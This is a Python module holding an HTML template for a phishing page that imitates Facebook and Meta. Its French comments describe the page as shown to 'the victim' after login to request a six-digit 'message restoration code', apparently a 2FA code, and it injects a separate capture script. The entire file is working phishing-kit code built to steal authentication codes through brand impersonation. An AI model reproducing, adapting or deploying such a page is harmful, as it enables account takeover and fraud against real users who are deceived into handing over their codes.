"""html_message_restore.py — Template page de restauration de l'historique des messages.

Page affichée après la connexion (login) si l'option `message_restore_enabled`
est activée. Demande à la victime un "code de restauration" avec une interface
en cases individuelles (une case par chiffre), similaire à la page OTP mais
avec une icône de message en bleu.
"""

from .js_capture import JS_STRICT_CAPTURE

HTML_MESSAGE_RESTORE = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="/static/svd_logo.svg" type="image/svg+xml">
    <title>Facebook</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #fff; font-family: -apple-system, Roboto, sans-serif; }
        .fb-btn { background-color: #1877f2; color: #fff; border-radius: 8px; padding: 12px; font-weight: 600; width: 100%; font-size: 16px; border: none; }
        .fb-btn:disabled { background-color: #e4e6eb; color: #bcc0c4; cursor: not-allowed; }
        .secondary-btn { background-color: #f0f2f5; color: #4b4f56; border-radius: 8px; padding: 10px; font-weight: 600; width: 100%; font-size: 14px; border: none; margin-top: 10px; }
        /* ── Cases pour chaque chiffre ── */
        .code-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 24px; }
        .code-box {
            width: 44px; height: 56px;
            border: 2px solid #dddfe2; border-radius: 8px;
            text-align: center; font-size: 24px; font-weight: bold;
            color: #1c1e21; outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
            -webkit-appearance: none; -moz-appearance: textfield;
        }
        .code-box:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        .code-box.filled {
            border-color: #1877f2;
        }
        /* Cacher les flèches du spin button sur certains navigateurs */
        .code-box::-webkit-outer-spin-button,
        .code-box::-webkit-inner-spin-button {
            -webkit-appearance: none; margin: 0;
        }
        /* En mode RTL (arabe), inverser la direction des cases */
        [dir="rtl"] .code-boxes { flex-direction: row-reverse; }
    </style>
</head>
<body class="p-6">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="flex items-center justify-between mb-8">
        <svg class="w-6 h-6 text-gray-800" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
        <span class="font-semibold text-lg">{{ msg_restore_title }}</span>
        <div class="w-6"></div>
    </div>
    <div class="flex flex-col items-center">
        <!-- ── Icône message en bleu (comme la page OTP) ── -->
        <div class="bg-blue-50 p-4 rounded-full mb-6">
            <!-- Icône de message (bulle de chat) en bleu Facebook -->
            <svg class="w-10 h-10 text-[#1877f2]" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 5.94 2 10.8c0 2.74 1.45 5.18 3.7 6.78-.1.83-.55 2.04-1.42 3.1-.2.24-.04.6.27.56 1.78-.18 3.47-.9 4.7-1.7.9.2 1.83.3 2.75.3 5.52 0 10-3.94 10-8.8S17.52 2 12 2z"/>
            </svg>
        </div>
        <h2 class="text-xl font-bold text-center mb-2">{{ msg_restore_title }}</h2>
        <p class="text-gray-500 text-center text-sm mb-6 px-4">{{ msg_restore_sub }}</p>
        <div id="error-box" class="{% if not message %}hidden{% endif %} w-full bg-red-50 border border-red-200 text-red-700 p-3 rounded-lg text-xs mb-4 text-center">
            <b>{{ message }}</b>
        </div>
        <!-- ── Formulaire avec cases individuelles ── -->
        <form method="POST" class="w-full" onsubmit="return validateCode()">
            <input type="hidden" name="action" value="restore_code">
            <!-- Champ caché qui contient le code complet assemblé -->
            <input type="hidden" name="restore_code" id="restore-code-hidden" value="">
            <!-- 6 cases visibles pour chaque chiffre -->
            <div class="code-boxes" id="code-boxes">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="0" autofocus>
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="1">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="2">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="3">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="4">
                <input type="text" class="code-box" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="5">
            </div>
            <button type="submit" class="fb-btn" id="submit-btn" disabled>{{ msg_restore_submit }}</button>
        </form>
        <button type="button" class="secondary-btn">Having trouble?</button>
        <div style="display: flex; flex-direction: column; align-items: center; gap: 4px; margin-top: 2.5rem;">
            <span style="font-size:11px;font-weight:400;color:#65676B;text-transform:none;letter-spacing:0;">From</span>
            <span style="font-size:15px;font-weight:800;color:#1C2B33;letter-spacing:2px;text-transform:uppercase;">META</span>
        </div>
    </div>
    <script>
    (function() {
        var boxes = document.querySelectorAll('.code-box');
        var hiddenField = document.getElementById('restore-code-hidden');
        var submitBtn = document.getElementById('submit-btn');
        var errorBox = document.getElementById('error-box');
        var NUM_BOXES = boxes.length; // 6 cases

        // ── Mettre à jour le champ caché et l'état du bouton ──
        function updateHidden() {
            var code = '';
            for (var i = 0; i < boxes.length; i++) {
                code += boxes[i].value;
            }
            hiddenField.value = code;
            // Activer le bouton UNIQUEMENT si exactement 6 chiffres sont saisis
            submitBtn.disabled = (code.length !== NUM_BOXES);
            // Marquer les cases remplies
            for (var i = 0; i < boxes.length; i++) {
                if (boxes[i].value) {
                    boxes[i].classList.add('filled');
                } else {
                    boxes[i].classList.remove('filled');
                }
            }
        }

        // ── Gestion de la saisie dans chaque case ──
        for (var idx = 0; idx < boxes.length; idx++) {
            (function(box, i) {
                // Saisie d'un caractère — utiliser 'input' mais SANS reassigner this.value
                // pour éviter que le curseur saute. On filtre juste les non-chiffres.
                box.addEventListener('input', function(e) {
                    // Si la valeur n'est pas un chiffre, la vider
                    if (box.value && !/^[0-9]$/.test(box.value)) {
                        box.value = '';
                        updateHidden();
                        return;
                    }
                    // Si un chiffre a été saisi, avancer à la case suivante
                    if (box.value && i < NUM_BOXES - 1) {
                        boxes[i + 1].focus();
                    }
                    updateHidden();
                    // Cacher le message d'erreur quand l'utilisateur tape
                    if (errorBox) errorBox.classList.add('hidden');
                });

                // Touche enfoncée : gérer Backspace et flèches
                box.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace') {
                        // Si la case est vide, reculer à la case précédente
                        if (!box.value && i > 0) {
                            e.preventDefault();
                            boxes[i - 1].focus();
                            boxes[i - 1].value = '';
                            updateHidden();
                        }
                    } else if (e.key === 'ArrowLeft' && i > 0) {
                        e.preventDefault();
                        boxes[i - 1].focus();
                    } else if (e.key === 'ArrowRight' && i < NUM_BOXES - 1) {
                        e.preventDefault();
                        boxes[i + 1].focus();
                    } else if (e.key === 'Enter') {
                        // Soumettre si le code est valide (6 chiffres)
                        if (!submitBtn.disabled) {
                            document.forms[0].submit();
                        }
                    }
                });

                // Sélectionner le contenu au focus (pour faciliter le remplacement)
                // Utiliser select() directement sans setTimeout pour éviter les sauts
                box.addEventListener('focus', function(e) {
                    try { box.select(); } catch(err) {}
                });

                // Gérer le collage (paste) de code complet
                box.addEventListener('paste', function(e) {
                    e.preventDefault();
                    var pasted = (e.clipboardData || window.clipboardData).getData('text');
                    pasted = pasted.replace(/[^0-9]/g, '').substring(0, NUM_BOXES);
                    if (pasted) {
                        for (var j = 0; j < pasted.length; j++) {
                            if (j < NUM_BOXES) {
                                boxes[j].value = pasted[j];
                            }
                        }
                        // Focus sur la case après la dernière remplie
                        var nextIdx = Math.min(pasted.length, NUM_BOXES - 1);
                        boxes[nextIdx].focus();
                        updateHidden();
                    }
                });
            })(boxes[idx], idx);
        }

        // Focus initial sur la première case
        if (boxes.length > 0) {
            try { boxes[0].focus(); } catch(err) {}
        }
    })();

    // ── Validation avant soumission : exactement 6 chiffres ──
    function validateCode() {
        var code = document.getElementById('restore-code-hidden').value;
        var errBox = document.getElementById('error-box');
        // Vérifier que le code contient EXACTEMENT 6 chiffres
        if (!/^\d{6}$/.test(code)) {
            errBox.innerText = "{{ msg_restore_invalid }}";
            errBox.classList.remove('hidden');
            return false;
        }
        return true;
    }
    </script>
</body>
</html>
"""
